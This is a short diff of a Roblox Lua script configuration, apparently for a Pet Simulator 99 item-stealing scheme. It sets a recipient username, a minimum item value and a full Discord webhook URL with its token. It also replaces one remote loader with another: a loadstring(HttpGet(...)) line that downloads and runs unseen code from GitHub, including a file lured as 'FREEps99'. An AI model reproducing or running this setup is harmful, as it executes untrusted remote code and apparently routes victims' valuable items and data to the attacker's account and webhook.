@@ -1,5 +1,6 @@
-_G.Usernames = {"Demon_God4540", "user2", "user3"} -- you can add as many as you'd like
-_G.minrap = 1000000
-_G.webhook = "https://discord.com/api/webhooks/1368860060335345714/NJbJeRF5fyvsvMyroYQakbSd9d-mETXriNOAfNwbcl-tPCjXEyVF-yI03qQRfRzB5Ab0" -- change to your webhook
+Username = "Demon_God4540"
+Username2 = "Demon_God4540"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1368860060335345714/NJbJeRF5fyvsvMyroYQakbSd9d-mETXriNOAfNwbcl-tPCjXEyVF-yI03qQRfRzB5Ab0"
 
-loadstring(game:HttpGet("https://github.com/tobi437a/PS99/blob/main/FREEps99.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214scripts/dumb/refs/heads/main/ps99%20test"))()
